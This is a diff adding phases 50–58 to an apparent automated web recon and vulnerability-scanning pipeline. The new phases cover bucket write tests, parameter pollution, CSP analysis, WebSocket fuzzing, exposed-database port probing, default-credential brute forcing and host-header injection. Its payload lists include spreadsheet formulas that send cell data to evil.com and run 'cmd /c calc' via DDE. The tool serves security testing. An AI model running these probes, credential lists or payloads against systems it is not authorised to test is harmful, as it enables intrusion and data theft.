@@ -7565,6 +7565,1254 @@ async def phase_49_FRAMEWORKS(
     return {"49-FRAMEWORKS": str(_out), "count": len(findings)}
 
 
+# ────────────────── Phase 50-BUCKET-PERMS: Bucket Permission Auditing ──────────
+async def phase_50_BUCKET_PERMS(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"50-BUCKET-PERMS"}:
+        return {}
+    _out = outdir / "bucket_permissions.txt"
+    if _out.exists() and not force:
+        return {"50-BUCKET-PERMS": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 50-BUCKET-PERMS: cloud bucket permission auditing")
+    findings: List[str] = []
+    _b_urlopen = _get_urlopener()
+    _b_extra_headers = _extra_headers_dict()
+    buckets_file = outdir / "cloud_buckets.txt"
+    bucket_entries = read_lines(buckets_file) if buckets_file.exists() else []
+    if not bucket_entries:
+        findings.append("[bucket-perms] No cloud buckets to audit")
+        out = ensure(_out)
+        out.write_text("\n".join(findings) + "\n")
+        return {"50-BUCKET-PERMS": str(out), "count": 0}
+
+    async def _probe_bucket(url: str, label: str) -> List[str]:
+        res: List[str] = []
+        try:
+            req = urllib.request.Request(url, method="GET",
+                headers={"User-Agent": "Mozilla/5.0", **_b_extra_headers})
+            s, _, body_bytes = await _async_urlopen(_b_urlopen, req, timeout=10)
+            body = body_bytes.decode("utf-8", errors="ignore")
+            if s == 200 and ("<Key" in body or "<Contents" in body or "ETag" in body or "Name>" in body):
+                res.append(f"[bucket-public-read] {label} — {url} — HTTP {s} (public listing accessible)")
+            elif s == 200:
+                res.append(f"[bucket-public-access] {label} — {url} — HTTP {s}")
+            elif s in (301, 302, 307):
+                res.append(f"[bucket-redirect] {label} — {url} — HTTP {s}")
+        except urllib.error.HTTPError as e:
+            if e.code in (403, 400):
+                pass
+            elif e.code == 404:
+                pass
+            else:
+                res.append(f"[bucket-http-error] {label} — {url} — HTTP {e.code}")
+        except Exception:
+            pass
+        try:
+            put_req = urllib.request.Request(url + "/.reconchain_permtest",
+                data=b"reconchain-permtest", method="PUT",
+                headers={"User-Agent": "Mozilla/5.0", **_b_extra_headers})
+            ps, _, _ = await _async_urlopen(_b_urlopen, put_req, timeout=10)
+            if ps in (200, 201, 204):
+                res.append(f"[bucket-public-write] {label} — {url} — PUT HTTP {ps} (unauthenticated write)")
+        except urllib.error.HTTPError as e:
+            if e.code == 405:
+                res.append(f"[bucket-write-allowed] {label} — {url} — PUT not allowed (expected)")
+        except Exception:
+            pass
+        return res
+
+    for entry in bucket_entries:
+        entry_lower = entry.lower()
+        if "s3" in entry_lower or "amazonaws" in entry_lower or "aws" in entry_lower:
+            for region in ["us-east-1", "eu-west-1", "us-west-2", ""]:
+                base = entry.split(".s3")[0] if ".s3" in entry else entry.split("://")[-1].split("/")[0]
+                url = f"https://{base}.s3.{region}.amazonaws.com/" if region else f"https://{base}.s3.amazonaws.com/"
+                r = await _probe_bucket(url, entry[:60])
+                findings.extend(r)
+        elif "blob.core" in entry_lower or "azure" in entry_lower:
+            url = entry.rstrip("/") + "?restype=container&comp=list" if "?" not in entry else entry
+            r = await _probe_bucket(url, entry[:60])
+            findings.extend(r)
+        elif "storage.googleapis" in entry_lower or "gcp" in entry_lower or "googleapis" in entry_lower:
+            r = await _probe_bucket(entry.rstrip("/") + "/", entry[:60])
+            findings.extend(r)
+        else:
+            for prefix in ["https://", "http://"]:
+                if entry.startswith(prefix):
+                    r = await _probe_bucket(entry.rstrip("/") + "/", entry[:60])
+                    findings.extend(r)
+
+    if not findings:
+        findings.append("[bucket-perms] No public bucket permissions detected")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"50-BUCKET-PERMS: {len(findings)} bucket permission findings → {out}")
+    return {"50-BUCKET-PERMS": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 51-HPP: HTTP Parameter Pollution ─────────────────────
+async def phase_51_HPP(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"51-HPP"}:
+        return {}
+    _out = outdir / "hpp.txt"
+    if _out.exists() and not force:
+        return {"51-HPP": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 51-HPP: HTTP parameter pollution detection")
+    findings: List[str] = []
+    _h_urlopen = _get_urlopener()
+    _h_extra_headers = _extra_headers_dict()
+    urls = outdir / "urls_all.txt"
+    all_urls = read_lines(urls) if urls.exists() else []
+    if not all_urls:
+        log("warn", "51-HPP: no URLs; skipping")
+        return {"51-HPP": str(_out), "count": 0}
+    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:50]
+    hpp_pollutions = ["first", "last", "any", "concat"]
+    for u in param_urls:
+        parsed = urllib.parse.urlparse(u)
+        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        if not qs:
+            continue
+        for param_name in list(qs.keys())[:3]:
+            orig_val = qs[param_name][0]
+            if param_name.lower() in _SKIP_PARAMS:
+                continue
+            for strategy in hpp_pollutions:
+                try:
+                    if strategy == "first":
+                        test_qs = urllib.parse.urlencode({param_name: [orig_val, "hpp_test_first"]}, doseq=True)
+                    elif strategy == "last":
+                        test_qs = urllib.parse.urlencode({param_name: ["hpp_test_last", orig_val]}, doseq=True)
+                    elif strategy == "any":
+                        test_qs = urllib.parse.urlencode({param_name: [orig_val, "hpp_test_any"]}, doseq=True)
+                    else:
+                        test_qs = urllib.parse.urlencode(
+                            {f"{param_name}[]": orig_val, param_name: "hpp_test_concat"}, doseq=True)
+                    ref_qs = urllib.parse.urlencode(qs, doseq=True)
+                    ref_url = urllib.parse.urlunparse(parsed._replace(query=ref_qs))
+                    test_url = urllib.parse.urlunparse(parsed._replace(query=test_qs))
+                    await _throttle_rate()
+                    req = urllib.request.Request(ref_url, headers={"User-Agent": "Mozilla/5.0", **_h_extra_headers})
+                    _, _, ref_body_bytes = await _async_urlopen(_h_urlopen, req, timeout=10)
+                    treq = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_h_extra_headers})
+                    _, _, test_body_bytes = await _async_urlopen(_h_urlopen, treq, timeout=10)
+                    ref_body = ref_body_bytes.decode("utf-8", errors="ignore")
+                    test_body = test_body_bytes.decode("utf-8", errors="ignore")
+                    if len(test_body) != len(ref_body) or "hpp_test" in test_body:
+                        findings.append(
+                            f"[hpp-reflected] {test_url} param={param_name} strategy={strategy} "
+                            f"(response differs from baseline)"
+                        )
+                        break
+                except Exception:
+                    continue
+    if not findings:
+        findings.append("[hpp] No HTTP parameter pollution candidates detected")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"51-HPP: {len(findings)} HPP findings → {out}")
+    return {"51-HPP": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 52-SERVERLESS: Serverless Endpoint Discovery ─────────
+_SERVERLESS_PATHS = [
+    "/api", "/api/", "/api/v1", "/api/v2", "/api/v3",
+    "/prod", "/dev", "/staging",
+    "/lambda", "/functions", "/function",
+    "/.netlify/functions", "/.netlify/",
+    "/_ah/api",  # GAE
+    "/api/users", "/api/health", "/api/status", "/api/config",
+    "/api/swagger.json", "/api/openapi.json",
+    "/api/graphql", "/graphql",
+    "/admin/api", "/admin",
+    "/.env", "/.env.local",
+]
+
+async def phase_52_SERVERLESS(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"52-SERVERLESS"}:
+        return {}
+    _out = outdir / "serverless_endpoints.txt"
+    if _out.exists() and not force:
+        return {"52-SERVERLESS": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 52-SERVERLESS: serverless / cloud function endpoint discovery")
+    findings: List[str] = []
+    _s_urlopen = _get_urlopener()
+    _s_extra_headers = _extra_headers_dict()
+    hosts_file = outdir / "hosts.txt"
+    hosts = read_lines(hosts_file) if hosts_file.exists() else []
+    if not hosts:
+        log("warn", "52-SERVERLESS: no hosts; skipping")
+        return {"52-SERVERLESS": str(_out), "count": 0}
+    for host in hosts[:20]:
+        host_clean = host.split(":")[0].strip()
+        if not host_clean:
+            continue
+        for scheme in ("https://", "http://"):
+            for path in _SERVERLESS_PATHS:
+                url = f"{scheme}{host_clean}{path}"
+                try:
+                    req = urllib.request.Request(url, method="GET",
+                        headers={"User-Agent": "Mozilla/5.0", **_s_extra_headers})
+                    s, _, b = await _async_urlopen(_s_urlopen, req, timeout=8)
+                    if s in (200, 201, 202, 204, 401, 403):
+                        body_sample = b.decode("utf-8", errors="ignore")[:200]
+                        kw_found = [kw for kw in ["api", "user", "admin", "graphql", "swagger", "lambda", "function", "cloud", "runtime", "serverless"] if kw in body_sample.lower()]
+                        extra = f" keywords={kw_found}" if kw_found else ""
+                        findings.append(f"[serverless-endpoint] {url} — HTTP {s}{extra}")
+                except (urllib.error.HTTPError, urllib.error.URLError, OSError):
+                    pass
+                except Exception:
+                    pass
+    if not findings:
+        findings.append("[serverless] No serverless endpoints discovered")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"52-SERVERLESS: {len(findings)} serverless endpoints → {out}")
+    return {"52-SERVERLESS": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 53-CSP: CSP Bypass Analysis ──────────────────────────
+_CSP_BYPASS_CDNS = {
+    "cdn.jsdelivr.net", "cdnjs.cloudflare.com", "unpkg.com", "ajax.googleapis.com",
+    "ajax.aspnetcdn.com", "stackpath.bootstrapcdn.com", "maxcdn.bootstrapcdn.com",
+    "code.jquery.com", "cdn.shopify.com", "cdn.rawgit.com", "rawgit.com",
+    "gitcdn.xyz", "cdn.statically.io", "www.google.com", "accounts.google.com",
+    "apis.google.com", "youtube.com", "www.youtube.com", "platform.twitter.com",
+    "www.facebook.com", "staticxx.facebook.com",
+}
+
+async def phase_53_CSP(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"53-CSP"}:
+        return {}
+    _out = outdir / "csp_analysis.txt"
+    if _out.exists() and not force:
+        return {"53-CSP": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 53-CSP: Content-Security-Policy analysis")
+    findings: List[str] = []
+    _c_urlopen = _get_urlopener()
+    _c_extra_headers = _extra_headers_dict()
+    hosts_file = outdir / "hosts.txt"
+    hosts = read_lines(hosts_file) if hosts_file.exists() else []
+    if not hosts:
+        log("warn", "53-CSP: no hosts; skipping")
+        return {"53-CSP": str(_out), "count": 0}
+    for host in hosts[:20]:
+        host_clean = host.split(":")[0].strip()
+        if not host_clean:
+            continue
+        for scheme in ("https://", "http://"):
+            url = f"{scheme}{host_clean}/"
+            try:
+                req = urllib.request.Request(url, method="GET",
+                    headers={"User-Agent": "Mozilla/5.0", **_c_extra_headers})
+                s, headers, body_bytes = await _async_urlopen(_c_urlopen, req, timeout=10)
+                csp = headers.get("Content-Security-Policy") or headers.get("Content-Security-Policy-Report-Only") or ""
+                if csp:
+                    csp_lower = csp.lower()
+                    issues = []
+                    if "'unsafe-inline'" in csp_lower:
+                        issues.append("unsafe-inline present")
+                    if "'unsafe-eval'" in csp_lower:
+                        issues.append("unsafe-eval present")
+                    if "*.google.com" in csp_lower or "*.facebook.com" in csp_lower or "*.cdn" in csp_lower:
+                        issues.append("wildcard in CSP source")
+                    for cdn in _CSP_BYPASS_CDNS:
+                        if cdn in csp_lower:
+                            issues.append(f"script-source allows known-bypass CDN: {cdn}")
+                    if "https:" in csp_lower and "http:" not in csp_lower:
+                        pass
+                    elif "http:" in csp_lower:
+                        issues.append("CSP allows http: scheme (MITM risk)")
+                    if not csp_lower.startswith("default-src") and "default-src " not in csp_lower:
+                        issues.append("no default-src defined (fallback to open)")
+                    if issues:
+                        findings.append(f"[csp-issues] {url} — {'; '.join(issues)}")
+                    findings.append(f"[csp-header] {url} — {csp[:200]}")
+                else:
+                    findings.append(f"[csp-missing] {url} — no Content-Security-Policy header")
+                break
+            except (urllib.error.HTTPError, urllib.error.URLError, OSError):
+                continue
+            except Exception:
+                continue
+        else:
+            continue
+    if not findings:
+        findings.append("[csp] No CSP issues found")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"53-CSP: {len(findings)} CSP findings → {out}")
+    return {"53-CSP": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 54-WS-FUZZ: WebSocket Message Fuzzing ────────────────
+_WS_FUZZ_PAYLOADS = [
+    b'{"type":"ping"}',
+    b'{"type":"subscribe","channel":"admin"}',
+    b'{"type":"auth","token":"none"}',
+    b'{"operationName":"IntrospectionQuery","query":"{__schema{types{name}}}","variables":{}}',
+    b'{"query":"mutation{__debug{setCookie(name:\"x\",value:\"x\")}__sleep(ms:30000)}"}',
+    b'<script>alert(1)</script>',
+    b'{"id":"1","jsonrpc":"2.0","method":"listDatabases","params":{}}',
+    b'\x00\x01\x02\x03',
+    b'A' * 10000,
+    b'{"type":"publish","channel":"*","data":"test"}',
+]
+
+async def phase_54_WS_FUZZ(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"54-WS-FUZZ"}:
+        return {}
+    _out = outdir / "websocket_fuzz.txt"
+    if _out.exists() and not force:
+        return {"54-WS-FUZZ": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 54-WS-FUZZ: WebSocket message fuzzing")
+    if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
+        log("warn", "54-WS-FUZZ: raw sockets incompatible with proxy; skipping")
+        return {"54-WS-FUZZ": str(_out), "count": 0}
+    findings: List[str] = []
+    _ws_extra_headers = _extra_headers_dict()
+    ws_file = outdir / "websocket.txt"
+    ws_findings = read_lines(ws_file) if ws_file.exists() else []
+    ws_endpoints: List[str] = []
+    for line in ws_findings:
+        for proto in ("wss://", "ws://"):
+            if proto in line:
+                parts = line.split()
+                for p in parts:
+                    if p.startswith(proto):
+                        ws_endpoints.append(p)
+                        break
+                break
+    ws_endpoints = ws_endpoints[:5]
+    if not ws_endpoints:
+        ws_file2 = outdir / "endpoints_wss.txt"
+        if ws_file2.exists():
+            ws_endpoints = read_lines(ws_file2)[:5]
+    if not ws_endpoints:
+        findings.append("[ws-fuzz] No WebSocket endpoints to fuzz")
+        out = ensure(_out)
+        out.write_text("\n".join(findings) + "\n")
+        return {"54-WS-FUZZ": str(out), "count": 0}
+
+    import socket as _ws_socket
+    import ssl as _ws_ssl
+    import base64 as _ws_b64
+    import struct as _ws_struct
+
+    def _ws_connect(endpoint: str) -> Tuple[Optional[_ws_socket.socket], Optional[str]]:
+        try:
+            parsed = urllib.parse.urlparse(endpoint)
+            scheme = parsed.scheme
+            host = parsed.hostname or ""
+            port = parsed.port or (443 if scheme == "wss" else 80)
+            path = parsed.path or "/"
+            sock = _ws_socket.socket(_ws_socket.AF_INET, _ws_socket.SOCK_STREAM)
+            sock.settimeout(5)
+            if scheme == "wss":
+                ctx = _ws_ssl.create_default_context()
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+            sock.connect((host, port))
+            ws_key = _ws_b64.b64encode(os.urandom(16)).decode()
+            upgrade = (
+                f"GET {path} HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"Upgrade: websocket\r\n"
+                f"Connection: Upgrade\r\n"
+                f"Sec-WebSocket-Key: {ws_key}\r\n"
+                f"Sec-WebSocket-Version: 13\r\n"
+                f"\r\n"
+            )
+            sock.sendall(upgrade.encode())
+            resp = b""
+            try:
+                while True:
+                    chunk = sock.recv(4096)
+                    if not chunk:
+                        break
+                    resp += chunk
+                    if b"\r\n\r\n" in resp:
+                        break
+            except _ws_socket.timeout:
+                pass
+            if b"101" in resp and b"websocket" in resp.lower():
+                return sock, endpoint
+            sock.close()
+        except Exception:
+            try:
+                sock.close()
+            except Exception:
+                pass
+        return None, None
+
+    def _ws_encode(data: bytes, opcode: int = 0x1) -> bytes:
+        frame = bytearray()
+        frame.append(0x80 | opcode)
+        mask = os.urandom(4)
+        length = len(data)
+        if length < 126:
+            frame.append(0x80 | length)
+        elif length < 65536:
+            frame.append(0x80 | 126)
+            frame += _ws_struct.pack("!H", length)
+        else:
+            frame.append(0x80 | 127)
+            frame += _ws_struct.pack("!Q", length)
+        frame += mask
+        frame += bytes(b ^ mask[i % 4] for i, b in enumerate(data))
+        return bytes(frame)
+
+    def _ws_send(sock: _ws_socket.socket, data: bytes, timeout: float = 4.0) -> Optional[bytes]:
+        sock.settimeout(timeout)
+        try:
+            sock.sendall(_ws_encode(data))
+            resp = b""
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                resp += chunk
+            return resp
+        except _ws_socket.timeout:
+            return None
+        except Exception:
+            return None
+
+    for ep in ws_endpoints:
+        sock, _ = _ws_connect(ep)
+        if sock is None:
+            continue
+        for i, payload in enumerate(_WS_FUZZ_PAYLOADS):
+            try:
+                resp = _ws_send(sock, payload, timeout=3.0)
+                if resp:
+                    rtext = resp.decode("utf-8", errors="ignore").lower()
+                    indicators = ["error", "exception", "traceback", "syntaxerror", "admin", "database",
+                                  "password", "token", "secret", "debug", "stack"]
+                    detected = [ind for ind in indicators if ind in rtext]
+                    if detected:
+                        findings.append(
+                            f"[ws-fuzz-interesting] {ep} payload#{i} — interesting response: {detected}"
+                        )
+                    elif len(resp) > 1024:
+                        findings.append(f"[ws-fuzz-large-response] {ep} payload#{i} — {len(resp)} bytes")
+            except Exception:
+                continue
+        sock.close()
+
+    if not findings:
+        findings.append("[ws-fuzz] No interesting WebSocket fuzzing results")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"54-WS-FUZZ: {len(findings)} WS fuzz findings → {out}")
+    return {"54-WS-FUZZ": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 55-CSV-INJECT: CSV/Excel Formula Injection ───────────
+_CSVI_PAYLOADS = [
+    "=CMD|'/C calc'!A0",
+    "=HYPERLINK(\"http://evil.com/exfil?data=\"&A1,\"Click here\")",
+    "=DDE(\"cmd\";\"/c calc\";\"AAA\")",
+    "=MSEXCEL|'/C calc'!A0",
+    '+DDE("cmd";"/c calc";"AAA")',
+    '=IMPORTXML(CONCATENATE("http://evil.com/?d=",MID(A1,1,50)),"//a")',
+    "=WEBSERVICE(\"http://evil.com/\"&A1)",
+    "@SUM(1+1)*CMD|'/C calc'!A0",
+    "=10+20",
+    "=1*1",
+]
+
+async def phase_55_CSV_INJECT(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"55-CSV-INJECT"}:
+        return {}
+    _out = outdir / "csv_injection.txt"
+    if _out.exists() and not force:
+        return {"55-CSV-INJECT": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 55-CSV-INJECT: CSV / Excel formula injection")
+    findings: List[str] = []
+    _csv_urlopen = _get_urlopener()
+    _csv_extra_headers = _extra_headers_dict()
+    urls = outdir / "urls_all.txt"
+    all_urls = read_lines(urls) if urls.exists() else []
+    if not all_urls:
+        log("warn", "55-CSV-INJECT: no URLs; skipping")
+        return {"55-CSV-INJECT": str(_out), "count": 0}
+    csv_params = {"export", "download", "report", "csv", "xls", "xlsx", "spreadsheet", "sheet", "format", "type", "file", "name", "filename", "title", "output"}
+    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:30]
+    for u in param_urls:
+        parsed = urllib.parse.urlparse(u)
+        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        if not qs:
+            continue
+        for param_name in qs:
+            if param_name.lower() not in csv_params:
+                continue
+            if param_name.lower() in _SKIP_PARAMS:
+                continue
+            for payload in _CSVI_PAYLOADS:
+                try:
+                    test_qs = qs.copy()
+                    test_qs[param_name] = [payload]
+                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
+                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
+                    await _throttle_rate()
+                    req = urllib.request.Request(test_url,
+                        headers={"User-Agent": "Mozilla/5.0", **_csv_extra_headers})
+                    _, resp_headers, body_bytes = await _async_urlopen(_csv_urlopen, req, timeout=10)
+                    body = body_bytes.decode("utf-8", errors="ignore")
+                    ctype = resp_headers.get("Content-Type", "")
+                    if "csv" in ctype.lower() or "spreadsheet" in ctype.lower() or "excel" in ctype.lower():
+                        if "=" in body[:50] or "+" in body[:50] or "@" in body[:50]:
+                            findings.append(
+                                f"[csvi-candidate] {test_url} param={param_name} payload={payload[:30]}"
+                            )
+                            break
+                except Exception:
+                    continue
+    if not findings:
+        findings.append("[csv-inject] No CSV injection candidates detected")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"55-CSV-INJECT: {len(findings)} CSV injection findings → {out}")
+    return {"55-CSV-INJECT": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 56-EXPOSED-DB: Exposed Database / Storage Probing ────
+_EXPOSED_DB_PATHS = [
+    ("/_search", "Elasticsearch"),
+    ("/.kibana", "Kibana"),
+    ("/. elasticsearch", "Elasticsearch"),
+    ("/sockjs-node/info", "Node.js/SockJS"),
+    ("/.env", ".env file"),
+    ("/.git/config", "Git config"),
+    ("/console", "Cloud console"),
+    ("/kibana", "Kibana"),
+    ("/api/status", "API status"),
+    ("/health", "Health endpoint"),
+    ("/swagger-ui.html", "Swagger UI"),
+    ("/actuator", "Spring Actuator"),
+    ("/actuator/health", "Actuator health"),
+    ("/actuator/env", "Actuator env"),
+]
+
+_EXPOSED_DB_PORTS = [
+    (9200, "Elasticsearch HTTP"),
+    (9300, "Elasticsearch transport"),
+    (5601, "Kibana"),
+    (9090, "Prometheus"),
+    (3000, "Grafana/API"),
+    (6379, "Redis"),
+    (27017, "MongoDB"),
+    (5432, "PostgreSQL"),
+    (3306, "MySQL"),
+    (8081, "CouchDB"),
+    (5984, "CouchDB"),
+    (9000, "Hadoop/HDFS"),
+    (50070, "Hadoop NameNode"),
+    (8088, "Hadoop YARN"),
+    (2375, "Docker API"),
+    (8443, "Kubernetes API"),
+    (6443, "Kubernetes API"),
+    (10250, "Kubelet API"),
+    (10255, "Kubelet API"),
+]
+
+async def phase_56_EXPOSED_DB(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"56-EXPOSED-DB"}:
+        return {}
+    _out = outdir / "exposed_databases.txt"
+    if _out.exists() and not force:
+        return {"56-EXPOSED-DB": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 56-EXPOSED-DB: exposed database / storage probing")
+    findings: List[str] = []
+    _db_urlopen = _get_urlopener()
+    _db_extra_headers = _extra_headers_dict()
+    hosts_file = outdir / "hosts.txt"
+    hosts = read_lines(hosts_file) if hosts_file.exists() else []
+    if not hosts:
+        hosts = read_lines(outdir / "resolved.txt") if (outdir / "resolved.txt").exists() else []
+    if not hosts:
+        log("warn", "56-EXPOSED-DB: no hosts; skipping")
+        return {"56-EXPOSED-DB": str(_out), "count": 0}
+    ports_file = outdir / "ports.txt"
+    all_ports: List[str] = read_lines(ports_file) if ports_file.exists() else []
+    for host in hosts[:20]:
+        host_clean = host.split(":")[0].strip()
+        if not host_clean:
+            continue
+        for port, label in _EXPOSED_DB_PORTS:
+            port_str = f"{host_clean}:{port}"
+            if all_ports and not any(port_str in p or f":{port}" in p for p in all_ports):
+                continue
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(3)
+                result = sock.connect_ex((host_clean, port))
+                sock.close()
+                if result == 0:
+                    findings.append(f"[exposed-db-port] {host_clean}:{port} — {label} — port open")
+                    for path, plabel in _EXPOSED_DB_PATHS:
+                        if port in (9200, 9300) and "elasticsearch" in label.lower():
+                            url = f"http://{host_clean}:{port}/"
+                        elif port == 5601:
+                            url = f"http://{host_clean}:{port}/app/kibana"
+                        else:
+                            url = f"http://{host_clean}:{port}{path}"
+                        try:
+                            req = urllib.request.Request(url, method="GET",
+                                headers={"User-Agent": "Mozilla/5.0", **_db_extra_headers})
+                            s, _, db_body = await _async_urlopen(_db_urlopen, req, timeout=5)
+                            if s in (200, 201, 401, 403):
+                                body_preview = db_body.decode("utf-8", errors="ignore")[:150]
+                                findings.append(
+                                    f"  [exposed-service] {url} — HTTP {s} — {label} "
+                                    f"body: {body_preview[:100]}"
+                                )
+                        except Exception:
+                            pass
+            except Exception:
+                continue
+    if not findings:
+        findings.append("[exposed-db] No exposed database services detected")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"56-EXPOSED-DB: {len(findings)} exposure findings → {out}")
+    return {"56-EXPOSED-DB": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 57-DEFAULT-CREDS: Default Credentials Testing ────────
+_DEFAULT_CREDS = [
+    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
+    ("admin", "123456"), ("admin", "letmein"), ("admin", "root"),
+    ("root", "root"), ("root", "admin"), ("root", "toor"),
+    ("user", "user"), ("user", "password"), ("user", "123456"),
+    ("guest", "guest"), ("test", "test"), ("demo", "demo"),
+    ("administrator", "administrator"), ("admin", "Passw0rd!"),
+    ("admin", "p@ssw0rd"), ("admin", "changeme"), ("admin", "1234"),
+    ("tomcat", "tomcat"), ("admin", "s3cr3t"),
+    ("admin", "1q2w3e4r"), ("admin", "qwerty"),
+    ("pi", "raspberry"), ("ubnt", "ubnt"),
+    ("manager", "manager"), ("kibana", "kibana"),
+    ("elastic", "changeme"), ("kibana", "changeme"),
+]
+
+async def phase_57_DEFAULT_CREDS(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"57-DEFAULT-CREDS"}:
+        return {}
+    _out = outdir / "default_creds.txt"
+    if _out.exists() and not force:
+        return {"57-DEFAULT-CREDS": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 57-DEFAULT-CREDS: default credentials probing")
+    findings: List[str] = []
+    _d_urlopen = _get_urlopener()
+    _d_extra_headers = _extra_headers_dict()
+    hosts_file = outdir / "hosts.txt"
+    hosts = read_lines(hosts_file) if hosts_file.exists() else []
+    if not hosts:
+        log("warn", "57-DEFAULT-CREDS: no hosts; skipping")
+        return {"57-DEFAULT-CREDS": str(_out), "count": 0}
+
+    login_paths = ["/login", "/admin", "/admin/login", "/wp-admin", "/api/login",
+                   "/api/auth", "/auth", "/signin", "/dashboard", "/manager",
+                   "/console", "/jenkins/login", "/admin.html", "/login.html",
+                   "/administrator", "/user/login", "/api/v1/login"]
+
+    for host in hosts[:15]:
+        host_clean = host.split(":")[0].strip()
+        if not host_clean:
+            continue
+        for scheme in ("https://", "http://"):
+            base = f"{scheme}{host_clean}"
+            for username, password in _DEFAULT_CREDS[:10]:
+                for path in login_paths[:5]:
+                    url = f"{base}{path}"
+                    try:
+                        creds_b64 = base64.b64encode(f"{username}:{password}".encode()).decode()
+                        req = urllib.request.Request(url, method="GET",
+                            headers={
+                                "User-Agent": "Mozilla/5.0",
+                                "Authorization": f"Basic {creds_b64}",
+                                **_d_extra_headers,
+                            })
+                        s, _, body = await _async_urlopen(_d_urlopen, req, timeout=8)
+                        if s in (200, 201, 204, 302, 303):
+                            body_lower = body.decode("utf-8", errors="ignore").lower()
+                            skip_indicators = ["invalid", "incorrect", "unauthorized", "forbidden",
+                                               "access denied", "wrong", "login failed", "authentication failed"]
+                            if not any(ind in body_lower for ind in skip_indicators):
+                                findings.append(
+                                    f"[default-creds-candidate] {url} — {username}:{password} — HTTP {s}"
+                                )
+                                break
+                    except urllib.error.HTTPError as e:
+                        if e.code in (200, 201, 204, 302, 303):
+                            findings.append(
+                                f"[default-creds-candidate] {url} — {username}:{password} — HTTP {e.code}"
+                            )
+                    except Exception:
+                        continue
+                else:
+                    continue
+                break
+            break
+
+    if not findings:
+        findings.append("[default-creds] No default credentials accepted")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"57-DEFAULT-CREDS: {len(findings)} default cred findings → {out}")
+    return {"57-DEFAULT-CREDS": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 58-HOST-INJECT: Host Header Injection ─────────────────
+_HOST_INJECT_PAYLOADS = [
+    "evil.com",
+    "evil.com:443",
+    "x: 127.0.0.1@evil.com",
+    "127.0.0.1",
+    "localhost",
+    "0.0.0.0",
+    "10.0.0.1",
+    "192.168.1.1",
+    "172.16.0.1",
+    "x: 0",
+    "x: 1",
+    "evil.com\\r\\nX-Forwarded-Host: evil.com",
+    "null",
+    "target.com@evil.com",
+    "target.com:evil.com",
+]
+
+async def phase_58_HOST_INJECT(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"58-HOST-INJECT"}:
+        return {}
+    _out = outdir / "host_header_injection.txt"
+    if _out.exists() and not force:
+        return {"58-HOST-INJECT": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 58-HOST-INJECT: host header injection testing")
+    findings: List[str] = []
+    _h_urlopen = _get_urlopener()
+    hosts_file = outdir / "hosts.txt"
+    hosts = read_lines(hosts_file) if hosts_file.exists() else []
+    if not hosts:
+        log("warn", "58-HOST-INJECT: no hosts; skipping")
+        return {"58-HOST-INJECT": str(_out), "count": 0}
+    for host in hosts[:10]:
+        host_clean = host.split(":")[0].strip()
+        if not host_clean:
+            continue
